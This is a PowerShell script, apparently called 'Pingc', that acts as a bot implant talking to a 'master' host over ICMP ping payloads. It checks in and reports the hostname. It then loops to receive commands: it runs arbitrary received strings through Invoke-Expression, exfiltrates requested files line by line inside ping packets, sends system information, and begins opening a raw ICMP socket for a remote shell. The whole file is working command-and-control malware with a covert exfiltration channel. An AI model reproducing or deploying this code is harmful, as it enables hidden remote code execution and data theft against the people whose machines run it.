param (
    [string]$dest = $(throw "-option is required."),
    [int]$sleep = 10
)

# check to see if the bot is actively checked in
# Read config file for test parameters
function Get-IniContent ($filePath)
{
    $ini = @{}
    switch -regex -file $FilePath
    {
        "^\[(.+)\]" # Section
        {
            $section = $matches[1]
            $ini[$section] = @{}
            $CommentCount = 0
        }
        "^(;.*)$" # Comment
        {
            $value = $matches[1]
            $CommentCount = $CommentCount + 1
            $name = "Comment" + $CommentCount
            $ini[$section][$name] = $value
        } 
        "(.+?)\s*=(.*)" # Key
        {
            $name,$value = $matches[1..2]
            $ini[$section][$name] = $value
        }
    }
    return $ini
}

function Get-SystemInfo 
{ 
  param($ComputerName = $env:ComputerName) 
  
      $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfig','Buildtype', 'RegisteredOwner','RegisteredOrganization','ProductID','InstallDate', 'StartTime','Manufacturer','Model','Type','Processor','BIOSVersion', 'WindowsFolder' ,'SystemFolder','StartDevice','Culture', 'UICulture', 'TimeZone','PhysicalMemory', 'AvailablePhysicalMemory' , 'MaxVirtualMemory', 'AvailableVirtualMemory','UsedVirtualMemory','PagingFile','Domain' ,'LogonServer','Hotfix','NetworkAdapter' 
      systeminfo.exe /FO CSV /S $ComputerName |  
            Select-Object -Skip 1 |  
            ConvertFrom-CSV -Header $header 
} 



#bot checkin function
function CheckIn($dest){
    $id = 123456789
    write-host "[*] Checking in..."
    $checkin_str = "Checkin "
    $sysinfo = Get-SystemInfo
    $checkin_str += "Windows" + " "
    $checkin_str += $sysinfo.Hostname
    
    $enc = [system.Text.Encoding]::UTF8
    $data = $enc.GetBytes($checkin_str)
    $ping = New-Object System.Net.NetworkInformation.Ping
    $master_resp = $ping.Send($dest,1000,$data)
    $enc = [System.Text.Encoding]::ASCII
    $resp_data = $enc.GetString($master_resp.buffer)
    if ($resp_data -like "id=*") {
        $id_str = $resp_data.split("=")
        $id = $id_str[1]
        write-host "[*] Checked in...bot Id set to $id"
    }
    return $id
}

write-output "Pingc Powershell - connecting to Master at $dest"
#$config = Get-iniContent .\conf\pingc.ini
#$enc = [system.Text.Encoding]::UTF8
#if ($config["general"]["checkedin"] -eq 0){
#    CheckIn($dest)
#}

$id = 123456789
$filesSent = @()
while ($id -eq 123456789){
    $id = CheckIn($dest)
    Start-sleep -s $sleep
}
$ask_str = "What shall I do master? $id"

#main loop
while ($true){
    $enc = [system.Text.Encoding]::UTF8
    $data = $enc.GetBytes($ask_str)
    $ping = New-Object System.Net.NetworkInformation.Ping
    $master_resp = $ping.Send($dest,1000,$data)
    $enc = [System.Text.Encoding]::ASCII
    $resp_data = $enc.GetString($master_resp.buffer)
    $resp_data_array = $resp_data.Split(" ")
    $master_cmd = $resp_data_array[0]

    if ($master_cmd -eq "run"){
        $cmd = $resp_data_array | Where-Object { $_ –ne "run" }
        Invoke-Expression "$cmd"
    }
    elseif ($master_cmd -eq "sleep"){
        $sleep = $resp_data_array[1]
        write-host "[*] Setting sleep to $sleep seconds"
    }
    elseif ($master_cmd -eq "get"){
        $file = $resp_data_array | Where-Object { $_ –ne "get" }
        write-host "[*] Master says to get file: $file"
        if ($filesSent -contains $file){
            write-host "[*] File already sent..."
        }
        else {
            $fileStart = "(FILE_START) $id $file"
            $enc = [system.Text.Encoding]::UTF8
            $data = $enc.GetBytes($fileStart)
            $ping = New-Object System.Net.NetworkInformation.Ping
            $master_resp = $ping.Send($dest,1000,$data)
            $enc = [System.Text.Encoding]::ASCII
            $resp_data = $enc.GetString($master_resp.buffer)
            $content = Get-Content $file
            foreach ($line in $content)
            {
                $sendStr = "(FILE) $id $file $line"
                $enc = [system.Text.Encoding]::UTF8
                $data = $enc.GetBytes($sendStr)
                $ping = New-Object System.Net.NetworkInformation.Ping
                $master_resp = $ping.Send($dest,1000,$data)
            }
        
            $fileEnd = "(FILE_END) $id $file"
            $enc = [system.Text.Encoding]::UTF8
            $data = $enc.GetBytes($fileEnd)
            $ping = New-Object System.Net.NetworkInformation.Ping
            $master_resp = $ping.Send($dest,1000,$data)
            $enc = [System.Text.Encoding]::ASCII
            $resp_data = $enc.GetString($master_resp.buffer)
            $filesSent += $file
        }
    }
    elseif ($master_cmd -eq "sysinfo"){
        write-host "[*] Master says to get sysinfo"
        $sysinfo = Get-SystemInfo
        $sysinfo_str = "sysinfo $id "
        $sysinfo_str += "Windows" + " "
        $sysinfo_str += $sysinfo.Hostname
        
        $enc = [system.Text.Encoding]::UTF8
        $data = $enc.GetBytes($sysinfo_str)
        $ping = New-Object System.Net.NetworkInformation.Ping
        $master_resp = $ping.Send($dest,1000,$data)
        $enc = [System.Text.Encoding]::ASCII
        $resp_data = $enc.GetString($master_resp.buffer)
        write-host "[*] Master response: $resp_data"
    }
    elseif ($master_cmd -eq "shell"){
        write-host "[*] Master wants a shell, master gets a shell!"
        #work on ICMP socket creation and IO into socket
        $master = new-object system.net.ipendpoint([net.ipaddress]$dest,0)
        $s = new-object system.net.sockets.socket(
            [Net.Sockets.AddressFamily]::InterNetwork,
            [Net.Sockets.SocketType]::Raw,
            [Net.Sockets.ProtocolType]::ICMP)
        $s.bind((new-object system.net.ipendpoint([net.ipaddress]"10.125.216.17",0)))
        $s.connect($master)
        write-host $s.RemoteEndPoint
        $byteIn = new-object byte[] 4
        $byteOut = new-object byte[] 4
        #[void]$s.iocontrol([Net.Sockets.IOControlCode]::ReceiveAll,$byteIn,$byteOut)        
        #while ($true) {
            $buffer = new-object byte[] $s.ReceiveBufferSize
        
            $enc = [system.Text.Encoding]::UTF8
            $shell_prompt = $enc.GetBytes("#")          
            write-host $s.SendTo($shell_prompt,$master)
        #    $s.ReceiveFrom($buffer,[ref]$master)
        #    write-host $buffer
        #}
    }

    write-host "[*] Sleeping..."
    Start-Sleep -s $sleep
}
